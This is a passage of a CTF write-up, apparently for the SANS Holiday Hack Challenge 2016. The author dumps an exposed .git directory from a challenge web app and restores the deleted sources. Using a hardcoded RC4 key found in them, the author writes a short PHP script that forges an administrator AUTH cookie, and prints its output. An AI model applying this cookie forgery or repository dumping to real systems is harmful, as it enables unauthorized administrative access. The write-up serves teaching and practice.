&lt;span class="go"&gt;2016-12-26 11:53:56 (14,2 MB/s) - « analytics.northpolewonderland.com/.git/index.html » sauvegardé [1394]&lt;/span&gt;

&lt;span class="go"&gt;Chargement de robots.txt ; veuillez ignorer les erreurs.&lt;/span&gt;
&lt;span class="go"&gt;--2016-12-26 11:53:56--  https://analytics.northpolewonderland.com/robots.txt&lt;/span&gt;
&lt;span class="go"&gt;Réutilisation de la connexion existante à analytics.northpolewonderland.com:443.&lt;/span&gt;
&lt;span class="go"&gt;requête HTTP transmise, en attente de la réponse… 404 Not Found&lt;/span&gt;
&lt;span class="go"&gt;2016-12-26 11:53:56 erreur 404 : Not Found.&lt;/span&gt;

&lt;span class="go"&gt;--2016-12-26 11:53:56--  https://analytics.northpolewonderland.com/.git/branches/&lt;/span&gt;
&lt;span class="go"&gt;Réutilisation de la connexion existante à analytics.northpolewonderland.com:443.&lt;/span&gt;
&lt;span class="go"&gt;requête HTTP transmise, en attente de la réponse… 200 OK&lt;/span&gt;
&lt;span class="go"&gt;Taille : non indiqué [text/html]&lt;/span&gt;
&lt;span class="go"&gt;Sauvegarde en : « analytics.northpolewonderland.com/.git/branches/index.html »&lt;/span&gt;

&lt;span class="go"&gt;[...]&lt;/span&gt;

&lt;span class="go"&gt;--2016-12-26 11:54:45--  https://analytics.northpolewonderland.com/.git/logs/refs/heads/master&lt;/span&gt;
&lt;span class="go"&gt;Réutilisation de la connexion existante à analytics.northpolewonderland.com:443.&lt;/span&gt;
&lt;span class="go"&gt;requête HTTP transmise, en attente de la réponse… 200 OK&lt;/span&gt;
&lt;span class="go"&gt;Taille : 4284 (4,2K) [application/octet-stream]&lt;/span&gt;
&lt;span class="go"&gt;Sauvegarde en : « analytics.northpolewonderland.com/.git/logs/refs/heads/master »&lt;/span&gt;

&lt;span class="go"&gt;analytics.northpolewonderland.com/.git/logs/refs/ 100%[=============================================================================================================&amp;gt;]   4,18K  --.-KB/s   ds 0s&lt;/span&gt;

&lt;span class="go"&gt;2016-12-26 11:54:45 (45,9 MB/s) — « analytics.northpolewonderland.com/.git/logs/refs/heads/master » sauvegardé [4284/4284]&lt;/span&gt;

&lt;span class="go"&gt;Terminé — 2016-12-26 11:54:45 —&lt;/span&gt;
&lt;span class="go"&gt;Temps total effectif : 50s&lt;/span&gt;
&lt;span class="go"&gt;Téléchargés : 305 fichiers, 614K en 0,9s (695 KB/s)&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; ls -la analytics.northpolewonderland.com
&lt;span class="go"&gt;total 12&lt;/span&gt;
&lt;span class="go"&gt;drwxr-xr-x 3 yme yme 4096 déc.  26 14:44 .&lt;/span&gt;
&lt;span class="go"&gt;drwxr-xr-x 3 yme yme 4096 déc.  26 14:44 ..&lt;/span&gt;
&lt;span class="go"&gt;drwxr-xr-x 8 yme yme 4096 déc.  26 14:45 .git&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Alright, the Git repository was completely downloaded, but the source files
don't seem to be here. Let's inspect the Git repository:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; &lt;span class="nb"&gt;cd&lt;/span&gt; analytics.northpolewonderland.com
&lt;span class="gp"&gt;$&lt;/span&gt; git status
&lt;span class="go"&gt;Sur la branche master&lt;/span&gt;
&lt;span class="go"&gt;Modifications qui ne seront pas validées :&lt;/span&gt;
&lt;span class="go"&gt;  (utilisez &amp;quot;git add/rm &amp;lt;fichier&amp;gt;...&amp;quot; pour mettre à jour ce qui sera validé)&lt;/span&gt;
&lt;span class="go"&gt;  (utilisez &amp;quot;git checkout -- &amp;lt;fichier&amp;gt;...&amp;quot; pour annuler les modifications dans la copie de travail)&lt;/span&gt;

&lt;span class="go"&gt;    supprimé :        README.md&lt;/span&gt;
&lt;span class="go"&gt;    supprimé :        crypto.php&lt;/span&gt;
&lt;span class="go"&gt;    supprimé :        css/bootstrap-theme.css&lt;/span&gt;
&lt;span class="go"&gt;    supprimé :        css/bootstrap-theme.css.map&lt;/span&gt;
&lt;span class="go"&gt;    supprimé :        css/bootstrap-theme.min.css&lt;/span&gt;
&lt;span class="go"&gt;    supprimé :        css/bootstrap-theme.min.css.map&lt;/span&gt;
&lt;span class="go"&gt;    supprimé :        css/bootstrap.css&lt;/span&gt;
&lt;span class="go"&gt;    supprimé :        css/bootstrap.css.map&lt;/span&gt;
&lt;span class="go"&gt;    supprimé :        css/bootstrap.min.css&lt;/span&gt;
&lt;span class="go"&gt;    supprimé :        css/bootstrap.min.css.map&lt;/span&gt;
&lt;span class="go"&gt;    supprimé :        css/bootstrap.min.css.orig&lt;/span&gt;
&lt;span class="go"&gt;    supprimé :        db.php&lt;/span&gt;
&lt;span class="go"&gt;    supprimé :        edit.php&lt;/span&gt;
&lt;span class="go"&gt;    supprimé :        fonts/glyphicons-halflings-regular.eot&lt;/span&gt;
&lt;span class="go"&gt;    supprimé :        fonts/glyphicons-halflings-regular.svg&lt;/span&gt;
&lt;span class="go"&gt;    supprimé :        fonts/glyphicons-halflings-regular.ttf&lt;/span&gt;
&lt;span class="go"&gt;    supprimé :        fonts/glyphicons-halflings-regular.woff&lt;/span&gt;
&lt;span class="go"&gt;    supprimé :        fonts/glyphicons-halflings-regular.woff2&lt;/span&gt;
&lt;span class="go"&gt;    supprimé :        footer.php&lt;/span&gt;
&lt;span class="go"&gt;    supprimé :        getaudio.php&lt;/span&gt;
&lt;span class="go"&gt;    supprimé :        header.php&lt;/span&gt;
&lt;span class="go"&gt;    supprimé :        index.php&lt;/span&gt;
&lt;span class="go"&gt;    supprimé :        js/bootstrap.js&lt;/span&gt;
&lt;span class="go"&gt;    supprimé :        js/bootstrap.min.js&lt;/span&gt;
&lt;span class="go"&gt;    supprimé :        js/npm.js&lt;/span&gt;
&lt;span class="go"&gt;    supprimé :        login.php&lt;/span&gt;
&lt;span class="go"&gt;    supprimé :        logout.php&lt;/span&gt;
&lt;span class="go"&gt;    supprimé :        mp3.php&lt;/span&gt;
&lt;span class="go"&gt;    supprimé :        query.php&lt;/span&gt;
&lt;span class="go"&gt;    supprimé :        report.php&lt;/span&gt;
&lt;span class="go"&gt;    supprimé :        sprusage.sql&lt;/span&gt;
&lt;span class="go"&gt;    supprimé :        test/Gemfile&lt;/span&gt;
&lt;span class="go"&gt;    supprimé :        test/Gemfile.lock&lt;/span&gt;
&lt;span class="go"&gt;    supprimé :        test/test_client.rb&lt;/span&gt;
&lt;span class="go"&gt;    supprimé :        this_is_html.php&lt;/span&gt;
&lt;span class="go"&gt;    supprimé :        this_is_json.php&lt;/span&gt;
&lt;span class="go"&gt;    supprimé :        uuid.php&lt;/span&gt;
&lt;span class="go"&gt;    supprimé :        view.php&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Sorry about the French Git output, but &amp;quot;supprimé&amp;quot; means &amp;quot;deleted&amp;quot;. So, every
source file was deleted, but the deletion was not commited, which means we can
cancel the deletion:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; git checkout -- .
&lt;span class="gp"&gt;$&lt;/span&gt; ls
&lt;span class="go"&gt;crypto.php  db.php    fonts       getaudio.php  index.php  login.php   mp3.php    README.md   sprusage.sql  this_is_html.php  uuid.php&lt;/span&gt;
&lt;span class="go"&gt;css         edit.php  footer.php  header.php    js         logout.php  query.php  report.php  test          this_is_json.php  view.php&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;You can download the code source archive &lt;a class="reference external" href="/docs/sans-christmas-challenge-2016/analytics.northpolewonderland.com_sources.tar.gz"&gt;here&lt;/a&gt;
(sha256: &lt;code&gt;13a4f237f817300e1e23a95edaf4ea407a4a346d20c2115ca13eea30b69ee65c&lt;/code&gt;).
It contains the Git repository.&lt;/p&gt;
&lt;p&gt;Alright, we now have access to the source code of the web application! This
should makes things easier. First of all, we can see that there's a file
&lt;code&gt;edit.php&lt;/code&gt;, which is not accessible when we're connected as
&lt;code&gt;guest&lt;/code&gt;:&lt;/p&gt;
&lt;img alt="analytics_guest_edit_denied.png" class="align-center" src="/images/sans-christmas-challenge-2016/analytics_guest_edit_denied.png" /&gt;
&lt;p&gt;Indeed, the &lt;code&gt;edit.php&lt;/code&gt; page is only accessible to the
&lt;code&gt;administrator&lt;/code&gt; user:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="x"&gt;# File edit.php&lt;/span&gt;
&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;
  &lt;span class="c1"&gt;# This should be the first require&lt;/span&gt;
  &lt;span class="k"&gt;require_once&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;this_is_html.php&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="k"&gt;require_once&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;db.php&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

  &lt;span class="c1"&gt;# Don&amp;#39;t allow anybody to access this page (yet!)&lt;/span&gt;
&lt;span class="hll"&gt;  &lt;span class="nx"&gt;restrict_page_to_users&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$db&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[]);&lt;/span&gt;
&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="x"&gt;# File this_is_html.php&lt;/span&gt;
&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="o"&gt;...&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
  &lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="nf"&gt;restrict_page_to_users&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$db&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$users&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="hll"&gt;    &lt;span class="nv"&gt;$username&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;get_username&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="nv"&gt;$username&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="nb"&gt;header&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Location: login.php&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
      &lt;span class="k"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="hll"&gt;    &lt;span class="nx"&gt;check_access&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$db&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$users&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;  &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="x"&gt;# File db.php&lt;/span&gt;
&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="o"&gt;...&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
  &lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="nf"&gt;get_username&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="nb"&gt;isset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_COOKIE&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;AUTH&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="hll"&gt;    &lt;span class="nv"&gt;$auth&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;json_decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;decrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;pack&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;H*&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nv"&gt;$_COOKIE&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;AUTH&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])),&lt;/span&gt; &lt;span class="k"&gt;true&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nv"&gt;$auth&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;username&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="o"&gt;...&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
 &lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="nf"&gt;check_access&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$db&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$users&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="c1"&gt;# Allow administrator to access any page&lt;/span&gt;
&lt;span class="hll"&gt;    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$username&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;administrator&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;      &lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;

    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="nb"&gt;in_array&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$users&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="nx"&gt;reply&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;403&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Access denied!&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
      &lt;span class="k"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;From this source file, we can determine that &lt;code&gt;administrator&lt;/code&gt; has access
to every page, and that the application uses the cookie &lt;code&gt;AUTH&lt;/code&gt; to
determine the current logged in username. Let's see how this cookie is
generated:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="x"&gt;# File login.php&lt;/span&gt;
&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="o"&gt;...&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Successfully logged in!&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="hll"&gt;    &lt;span class="nv"&gt;$auth&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;encrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;json_encode&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;
&lt;/span&gt;      &lt;span class="s1"&gt;&amp;#39;username&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;username&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;
      &lt;span class="s1"&gt;&amp;#39;date&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nb"&gt;date&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;DateTime&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="na"&gt;ISO8601&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
    &lt;span class="p"&gt;]));&lt;/span&gt;

    &lt;span class="nb"&gt;setcookie&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;AUTH&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;bin2hex&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$auth&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;

    &lt;span class="nb"&gt;header&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Location: index.php?msg=Successfully%20logged%20in!&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="x"&gt;# File crypto.php&lt;/span&gt;
&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;
  &lt;span class="nb"&gt;define&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;KEY&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x61\x17\xa4\x95\xbf\x3d\xd7\xcd\x2e\x0d\x8b\xcb\x9f\x79\xe1\xdc&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

  &lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="nf"&gt;encrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nb"&gt;mcrypt_encrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;MCRYPT_ARCFOUR&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;KEY&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$data&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;stream&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;

  &lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="nf"&gt;decrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nb"&gt;mcrypt_decrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;MCRYPT_ARCFOUR&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;KEY&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$data&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;stream&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;So, we can see that the username is stored in a JSON object, stored encrypted
in the cookie &lt;code&gt;AUTH&lt;/code&gt;. Since we have the encryption key in
&lt;code&gt;crypto.php&lt;/code&gt;, we can generate our own cookie:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;
    &lt;span class="k"&gt;include&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;crypto.php&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

    &lt;span class="nv"&gt;$auth&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;encrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;json_encode&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;
      &lt;span class="s1"&gt;&amp;#39;username&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;administrator&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
      &lt;span class="s1"&gt;&amp;#39;date&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nb"&gt;date&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;DateTime&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="na"&gt;ISO8601&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
    &lt;span class="p"&gt;]));&lt;/span&gt;

    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nb"&gt;bin2hex&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$auth&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; php exploit.php
&lt;span class="go"&gt;82532b2136348aaa1fa7dd2243dc0dc1e10948231f339e5edd5770daf9eef18a4384f6e7bca04d86e573b965cc9c6549b449486763a20363b71876884152&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We can now log into the application as administrator:&lt;/p&gt;
&lt;img alt="analytics_administrator_login.png" class="align-center" src="/images/sans-christmas-challenge-2016/analytics_administrator_login.png" /&gt;
&lt;p&gt;There was another, more elegant method, to recover &lt;code&gt;administrator&lt;/code&gt;'s
password. Since we have the Git repository of the web application, we have
access to every file's history. We can see that in the source of the website,
there is an SQL schema file, &lt;code&gt;sprusage.sql&lt;/code&gt;. This file is used to create
a database with the right schema. It's often created with a dump of the
currently deployed database. However, if we take a look at it, we won't see
any data in it, apart from the tables creation instructions:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;DROP&lt;/span&gt; &lt;span class="k"&gt;TABLE&lt;/span&gt; &lt;span class="k"&gt;IF&lt;/span&gt; &lt;span class="k"&gt;EXISTS&lt;/span&gt; &lt;span class="o"&gt;`&lt;/span&gt;&lt;span class="n"&gt;users&lt;/span&gt;&lt;span class="o"&gt;`&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="cm"&gt;/*!40101 SET @saved_cs_client     = @@character_set_client */&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="cm"&gt;/*!40101 SET character_set_client = utf8 */&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="k"&gt;CREATE&lt;/span&gt; &lt;span class="k"&gt;TABLE&lt;/span&gt; &lt;span class="o"&gt;`&lt;/span&gt;&lt;span class="n"&gt;users&lt;/span&gt;&lt;span class="o"&gt;`&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
  &lt;span class="o"&gt;`&lt;/span&gt;&lt;span class="n"&gt;uid&lt;/span&gt;&lt;span class="o"&gt;`&lt;/span&gt; &lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;11&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;NOT&lt;/span&gt; &lt;span class="k"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="o"&gt;`&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="o"&gt;`&lt;/span&gt; &lt;span class="nb"&gt;varchar&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;128&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;NOT&lt;/span&gt; &lt;span class="k"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="o"&gt;`&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="o"&gt;`&lt;/span&gt; &lt;span class="nb"&gt;varchar&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;128&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;NOT&lt;/span&gt; &lt;span class="k"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="k"&gt;PRIMARY&lt;/span&gt; &lt;span class="k"&gt;KEY&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;`&lt;/span&gt;&lt;span class="n"&gt;uid&lt;/span&gt;&lt;span class="o"&gt;`&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;ENGINE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;InnoDB&lt;/span&gt; &lt;span class="k"&gt;DEFAULT&lt;/span&gt; &lt;span class="n"&gt;CHARSET&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;latin1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="cm"&gt;/*!40101 SET character_set_client = @saved_cs_client */&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;But, if we take a look at the Git log, we can see that the file was &amp;quot;fixed&amp;quot;:&lt;/p&gt;
&lt;pre class="literal-block"&gt;
commit 62547860f9a6e0f3a3bdfd3f9b14fea3ac7f7c31
Author: me &amp;lt;me&amp;#64;example.org&amp;gt;
Date:   Mon Nov 21 21:15:08 2016 -0800

    Fix database dump
&lt;/pre&gt;
